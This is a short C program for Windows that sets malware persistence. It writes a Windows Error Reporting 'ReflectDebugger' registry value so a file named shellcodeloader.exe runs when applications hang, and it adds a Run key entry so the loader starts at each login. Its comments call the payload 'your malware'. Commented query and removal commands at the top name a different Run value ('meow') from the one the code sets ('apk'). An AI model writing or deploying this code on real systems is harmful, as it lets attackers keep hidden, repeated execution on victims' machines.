//reg query "HKLM\SOFTWARE\Microsoft\Windows\Windows Error Reporting\Hangs" /s
//reg query "HKLM\SOFTWARE\Microsoft\Windows\Windows Error Reporting\Hangs\ReflectDebugger" /s
//reg query "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run" /s

/*
Remove-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows\Windows Error Reporting\Hangs" -Name "ReflectDebugger"
Remove-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run" -Name "meow"
*/

#include <windows.h>
#include <string.h>

int main(int argc, char* argv[]) {
    HKEY hkey = NULL;

    // CORRECTED: WER hijacking requires the full command line including original parameters
    const wchar_t* werDebugger = L"\"C:\\werfault-hack\\shellcodeloader.exe\" -pr 1";

    // CORRECTED: Startup entry should point to your malicious executable, not WerFault
    const wchar_t* startupExe = L"\"C:\\werfault-hack\\shellcodeloader.exe\"";

    // Set WER hijacking - this will execute your malware when apps crash
    LONG res = RegOpenKeyEx(HKEY_LOCAL_MACHINE,
        L"SOFTWARE\\Microsoft\\Windows\\Windows Error Reporting\\Hangs",
        0, KEY_WRITE, &hkey);
    if (res == ERROR_SUCCESS) {
        RegSetValueEx(hkey, L"ReflectDebugger", 0, REG_SZ,
            (const BYTE*)werDebugger, (wcslen(werDebugger) + 1) * sizeof(wchar_t));
        RegCloseKey(hkey);
    }

    // Set startup persistence - this will run your malware on user login
    res = RegOpenKeyEx(HKEY_CURRENT_USER,
        L"SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run",
        0, KEY_WRITE, &hkey);
    if (res == ERROR_SUCCESS) {
        RegSetValueEx(hkey, L"apk", 0, REG_SZ,
            (const BYTE*)startupExe, (wcslen(startupExe) + 1) * sizeof(wchar_t));
        RegCloseKey(hkey);
    }

    return 0;
}
